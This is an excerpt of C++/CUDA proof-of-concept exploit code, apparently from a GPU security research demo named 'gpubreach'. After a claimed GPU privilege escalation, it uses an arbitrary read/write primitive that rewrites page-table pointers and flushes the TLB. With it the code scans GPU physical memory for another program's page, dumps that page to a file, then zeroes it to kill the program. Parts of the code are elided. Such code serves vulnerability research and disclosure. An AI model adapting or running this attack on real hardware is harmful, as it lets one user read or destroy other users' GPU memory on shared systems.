...
void
dump_memory (void *ptr, const std::string &filename)
{
  ...
  for (size_t i = 0; i < num_rows; i++)
    {
      ofs << std::hex << std::setw (16) << std::setfill ('0')
          << reinterpret_cast<uintptr_t> (&p[i]) << " " << std::setw (16)
          << p[i] << "\n";
    }
}
...
main (int argc, char *argv[])
{
  ...
  std::cout << "GPU Privilege Escalation Finished, proceeding to setting up "
               "environment for dumping user memory..."
            << '\n';
  ...
  std::cout << "(Stable Primitive Ready) Starting the specified program"
            << '\n';
  std::system ("nohup ./data_scripts/gpubreach_demo/app > "
               "./results/gpubreach_demo/app.out 2>&1 &");

  // -1GB conservative limit since the last few hundreds of memory in GPU is
  // unreadable.
  uint64_t memory_limit = get_memory_limit () - 1L * GB;
  uint64_t it_ptr = NULL_PTE;
  for (uint64_t i = 0; i < memory_limit; i += ALLOC_SIZE)
    {
      // Iterate through the memory limit. Set prim.arb_rw_ptr to point to
      // it_ptr
      prim.modify (it_ptr);
      prim.flush_tlb ();
      ...
      if (first_8B == 0xdeadbeefabcdabcd)
        {
          std::cout << "Found your page in " << (void *)it_ptr
                    << ", Value: " << (void *)0xdeadbeefabcdabcd << '\n';
          dump_memory (prim.data_device_ptr,
                       "results/gpubreach_demo/memdump.txt");

          std::cout << "Finished Dumping page, writing to physical location "
                       "of app to terminate."
                    << '\n';
          prim.modify (it_ptr);

          memset_ptr<<<1, 1>>> (prim.arb_rw_ptr, 0, ALLOC_SIZE);
